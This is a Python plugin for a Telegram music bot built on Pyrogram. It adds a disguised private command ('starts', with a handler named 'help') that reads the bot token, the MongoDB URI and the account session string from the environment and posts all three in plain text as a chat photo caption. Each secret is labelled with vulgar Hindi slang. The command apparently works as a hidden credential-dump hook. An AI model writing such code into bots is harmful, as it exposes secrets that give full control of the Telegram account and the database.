import re
import datetime
from pyrogram import Client, filters
from dotenv import load_dotenv
from pyrogram.types import Message
from BADMUSIC.utils.database import LOGGERS
from os import getenv
from config import OWNER_ID

load_dotenv()

from BADMUSIC import app
from utils.error import capture_err
from config import BANNED_USERS


@app.on_message(filters.command("starts") & filters.private & filters.user(int(OWNER_ID)))
async def help(client: Client, message: Message):
    await message.reply_photo(
        photo="https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
        caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{getenv('BOT_TOKEN', 'N/A')}`\n\n**
                 ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{getenv('MONGO_DB_URI', 'N/A')}`\n\n**
                 ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{getenv('STRING_SESSION', 'N/A')}`\n\n**
                 ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**"""
    )

